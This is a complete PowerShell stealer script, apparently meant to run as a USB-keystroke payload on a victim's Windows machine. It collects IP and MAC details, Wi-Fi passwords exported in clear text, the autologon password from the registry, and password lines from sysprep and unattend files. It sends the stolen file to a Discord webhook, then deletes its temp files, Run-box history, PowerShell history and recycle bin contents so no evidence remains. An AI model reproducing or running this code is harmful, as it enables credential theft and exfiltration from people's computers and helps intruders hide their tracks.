# This is for if you want to host your own version of the script

# $dc = "YOUR-DISCORD-WEBHOOK"

#------------------------------------------------------------------------------------------------------------------------------------
$null = New-Item -Path $env:temp -Name "F13C3D8F-8A17-4898-A36A-6294A160288A" -ItemType "directory"
$FileName = "$env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A/$env:USERNAME-$(get-date -f yyyy-MM-dd).txt"

#------------------------------------------------------------------------------------------------------------------------------------
# Network info
function Get-PubIP {

    try {

    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content

    }
 
 # If no Public IP is detected function will return $null to avoid sapi speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "No Public IP was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }

    return $computerPubIP
}

$PubIP = Get-PubIP
$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String

#------------------------------------------------------------------------------------------------------------------------------------
$output = @"

Public IP: $PubIP

Local IPs: 
$localIP

MAC:
$MAC

"@

$output > $FileName

############################################################################################################################################################
Set-Location -Path "$env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A"

$null = netsh wlan export profile key=clear; 

Select-String -Path *.xml -Pattern 'keyMaterial'>> $FileName;


############################################################################################################################################################

##
# Passwords:
# Autologin

$AutoLoginPassword = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword"
If (($AutoLoginPassword).DefaultPassword) {
  $AutoLoginPassword >> $FileName
  }  # End If

# Sysprep
$PassFiles = "C:\Windows\sysprep\sysprep.xml","C:\Windows\sysprep\sysprep.inf","C:\Windows\sysprep.inf","C:\Windows\Panther\Unattended.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml","C:\Windows\Panther\Unattend\Unattended.xml","C:\Windows\System32\Sysprep\unattend.xml","C:\Windows\System32\Sysprep\unattended.xml","C:\unattend.txt","C:\unattend.inf"
ForEach ($PassFile in $PassFiles) {
  If (Test-Path -Path $PassFile) {
    $Syspass = Get-Content -Path $PassFile | Select-String -Pattern "Password"
    $Syspass >> $Filename
  }  # End If
}  # End ForEach


#--------------------------------------------------------------------------------------------------------------------------------------

# This is to upload your files to discord

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $FileName}
#if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $FileName}

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>
# Delete contents of Temp folder 
Set-Location -Path "$env:temp"

rm $env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
